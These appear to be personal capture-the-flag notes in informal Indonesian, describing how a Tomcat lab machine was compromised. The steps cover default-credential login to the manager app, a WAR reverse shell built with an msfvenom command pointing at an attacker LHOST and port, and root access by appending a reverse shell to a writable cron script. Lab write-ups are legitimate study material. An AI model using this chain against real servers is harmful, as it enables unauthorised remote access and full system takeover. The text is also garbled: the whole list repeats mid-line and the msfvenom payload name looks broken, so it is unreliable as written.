# boot:
1. scan nmap ada apache tom sama jsp apa gitu -> fuzz ada host-manager, gagal dulu passwd nya nanti nemu default creds
2. login default creds cek manager sama host-manager -> ada secret dir
3. cek di manager -> ada fitur upload war extension nya upload revshell
4. msfvenom -p java/jsp_shell__tcp LHOST=ip LPORT=6060 -f war > exp.war -> p payload f format
5. nc in  -> klaim user flag


# PE :
1. pake linpeas -> ternyata cron job id.sh itu jalan terus sebagai root dan writeable
2. tambahin revshell di scriptnya -> nc aja tunggu terus -> nanti root sendiri
3. klaim root1. scan nmap ada apache tom sama jsp apa gitu -> fuzz ada host-manager, gagal dulu passwd nya nanti nemu default creds
2. login default creds cek manager sama host-manager -> ada secret dir
3. cek di manager -> ada fitur upload war extension nya upload revshell
4. msfvenom -p java/jsp_shell__tcp LHOST=ip LPORT=6060 -f war > exp.war -> p payload f format
5. nc in  -> klaim user flag


# PE :
1. pake linpeas -> ternyata cron job id.sh itu jalan terus sebagai root dan writeable
2. tambahin revshell di scriptnya -> nc aja tunggu terus -> nanti root sendiri
3. klaim root
